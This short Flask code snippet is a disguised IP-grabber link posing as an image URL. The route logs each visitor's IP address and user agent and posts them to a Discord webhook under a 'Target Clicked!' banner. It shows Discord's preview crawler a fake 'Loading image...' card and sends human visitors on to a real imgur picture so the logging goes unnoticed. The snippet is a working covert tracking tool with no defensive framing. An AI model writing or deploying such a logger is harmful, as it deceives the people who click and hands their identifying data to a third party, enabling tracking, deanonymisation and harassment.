@app.route('/view/image_01.png')
def logger():
    # 1. Grab the IP
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # 2. Send to Discord Webhook
    payload = {"content": f"🎯 **Target Clicked!**\nIP: `{user_ip}`\nUser-Agent: `{request.user_agent}`"}
    requests.post(WEBHOOK_URL, json=payload)

    # 3. The "Mask": This tells Discord to show a preview box
    if "discord" in request.user_agent.lower():
        return '''
        <html>
            <head>
                <meta property="og:title" content="Loading image...">
                <meta property="og:description" content="Click to open original">
                <meta property="og:image" content="https://tenor.com/sv/view/loading-discord-loading-discord-boxes-squares-gif-16187521">
                <meta name="twitter:card" content="summary_large_image">
            </head>
            <body></body>
        </html>
        '''
    
    # 4. The Redirect: Real people go to the image
    return redirect("https://i.imgur.com/BcNs5vF.jpg")
